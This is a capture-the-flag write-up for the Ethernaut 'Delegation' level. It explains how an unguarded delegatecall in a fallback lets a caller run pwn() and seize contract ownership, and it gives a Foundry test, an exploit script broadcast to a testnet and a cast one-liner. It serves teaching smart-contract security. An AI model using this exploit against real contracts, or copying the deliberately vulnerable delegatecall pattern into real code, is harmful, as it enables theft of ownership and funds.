## 👾 06. Delegation

<br>

<p align="center">
<img width="300" src="https://github.com/go-outside-labs/ethernaut-foundry-detailed-solutions-sol/assets/1130416/ea0f9698-e913-41b5-b611-0e1f742aad05">
</p>


<br>


### tl; dr

<br>


* in this challenge, we become `owner` by leveraging an attack surface generated from implementing the low-level function `delegatecall` (from opcode `DELEGATECALL`).

<br>

* exploitation of `delegatecall()` has been in several hacks in the wild, for example **[the parity multisig wallet hack, in 2017](https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7)**.

<br>
 

```solidity
contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```


<br>

---

### discussion

<br>

* `CALL` and `DELEGATECALL` opcodes allow ethereum developers to modularize their code.
  -  standard external message calls are handled by `CALL` (code is run in the context of the external contract/function). 
  - `DELEGATECALL` is almost identical, except that the code executed at the targeted address is run in the context of the calling contract (useful when writing libraries and for proxy patterns). 
  - when a contract executes `DELEGATECALL` to another contract, this contract is executed with the original contract `msg.sender`, `msg.value`, and storage (in particular, the contract's storage can be changed).
  - finally, the function `delegatecall()` is a way to **[make these external calls to other contracts](https://solidity-by-example.org/delegatecall/)**.


    
   

<br>

* in this problem, we are provided with two contracts. `Delegate()` is the parent contract, which we want to become `owner` of.
  - conveniently, the function `pwn()` is very explicit on being our target:

<br>

```solidity
contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}
```

<br>

* now, note that the variable `owner` is in the first slot of both contracts. 
    - ordering of variable slots (and their mismatches) are what `DELEGATECALL` exploits in the wild usually explore.
    - this is important because we are dealing with opcodes, as every variable has a specific slot and should match in both the origin and destination contracts.
    - in our case, we when trigger the fallback in `Delegate()` to generate a delegate call to run `pwn()` in `Delegation()`, the `owner` variable (which is at `slot0` of both contracts) updates `Delegation()`'s storage `slot0`.

<br>

* the second contract, which we have access, is `Delegation()`, comes with has another convenience: a `delegatecall()` in the `fallback` function.
  - this fallback function is simply forwarding everything to `Delegate()`:




<br>

```solidity
contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

<br>

* from a previous challenge, we know that fallback functions are like a "catch-all" in a contract, so it's pretty easy to access them. 
    - in this particular case, `delegatecall()` takes `msg.data` as input (*i.e.*, whatever data we pass when we trigger the fallback). 
    - it's pretty much an `exec`, as we can pass function calls through it.

<br>

* the last information we need is to learn how `deletecall()` passes arguments. 
  - the function signatures are encoded by computing **[Keccak-246](https://solidity-by-example.org/hashing/)** and keeping the first 4 bytes (the function selector in the EVM).

<br>

```solidity
delegatecall(abi.encodeWithSignature("func_signature", "arguments"));
```

<br>

* in our attack we will use `call(abi.encodeWithSignature("pwn()")` to trigger `fallback()` and become `owner`. 
  - this is also equivalent to the `eth` call `sendTransaction()`:

<br>

```solidity
sendTransaction({ 
    to: contract.address, 
    data: web3.eth.abi.encodeFunctionSignature("pwn()"), 
    from: hackerAddress
 })
```



<br>



----

### solution in solidity

<br>

* check `test/06/Delegation.t.sol`:

<br>

```solidity
contract DelegationTest is Test {

    Delegate public delegate = new Delegate(makeAddr("owner"));
    Delegation public level = new Delegation(address(delegate));
    address hacker = vm.addr(0x1337); 

    function testDelegationHack() public {

        vm.startPrank(hacker);
        assertNotEq(level.owner(), hacker);

        (bool success, ) = address(level).call(
            abi.encodeWithSignature("pwn()")
        );

        assertTrue(success);
        assertEq(level.owner(), hacker);

        vm.stopPrank();
        
    }
}
```

<br>

* run:

<br>

```shell
> forge test --match-contract DelegationTest -vvvv    
```



<br>

* submit with `script/06/Delegation.s.sol`:

<br>

```solidity
contract Exploit is Script {

    address instance = vm.envAddress("INSTANCE_LEVEL6"); 
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
    Delegation level = Delegation(instance); 
        
    function run() external {
        vm.startBroadcast(hacker);
        (bool success, ) = address(level).call(
            abi.encodeWithSignature("pwn()")
        );
        require(success);
        vm.stopBroadcast();
    }
}
```

<br>

* by running:

<br>

```shell
> forge script ./script/06/Delegation.s.sol --broadcast -vvvv --rpc-url sepolia
```

<br>


---

### alternative solution using `cast`

<br>

* get `methodId` for `pwn()`:

<br>

```shell
> cast calldata 'pwn()'
```

<br>

* use the result above to trigger `Delegation()` fallback function with a crafted `msg.data`:

<br>

```shell
> cast send <instance address> <calldata above> --gas <extra gas> --private-key=<private-key> --rpc-url=<sepolia url> 
```


<br>

----

### solution in the console

<br>

<p align="center">
<img width="600" src="https://github.com/go-outside-labs/ethernaut-foundry-detailed-solutions-sol/assets/1130416/088e8a77-9506-4cfb-a486-74e2e9682e93">
</p>


<br>
<br>

----


### pwned...

  
<p align="center">
<img width="400" src="https://github.com/go-outside-labs/ethernaut-foundry-writeups-sol/assets/138340846/ba3f82a3-00c0-43f9-a423-588d7f6e4c70">
</p>


<br>


----

### learning resources

<br>

* **[deletegatecall() by mario oettler](https://blockchain-academy.hs-mittweida.de/courses/solidity-coding-beginners-to-intermediate/lessons/solidity-5-calling-other-contracts-visibility-state-access/topic/delegatecall/)**
* **[proxy pattterns by openzeppelin](https://blog.openzeppelin.com/proxy-patterns)**
* **[delegatecall at solidity by example](https://solidity-by-example.org/hacks/delegatecall/)**
* **[contract upgrade anti-patterns by trail of bits](https://blog.trailofbits.com/2018/09/05/contract-upgrade-anti-patterns/)**
* **[solidity docs on delegatecall / callcode and libraries](https://docs.soliditylang.org/en/v0.8.11/introduction-to-smart-contracts.html?highlight=delegatecall#delegatecall-callcode-and-libraries)**
* **[difference between `CALL`, `CALLCODE`, `DELEGATECALL`](https://ethereum.stackexchange.com/questions/3667/difference-between-call-callcode-and-delegatecall)**
* **[delegatecall and fibonacci example in the ethereumbook](https://github.com/ethereumbook/ethereumbook/blob/develop/09smart-contracts-security.asciidoc#delegatecall)**
* **[unsafe delegatecall video from smart contract programmer](https://www.youtube.com/watch?v=bqn-HzRclps)**
* **[code injection with `DELEGATECALL` by go-outside-labs blockchain-auditing](https://github.com/go-outside-labs/blockchain-auditing/tree/main/advanced_expert/vulnerabilities/delegatecall)**

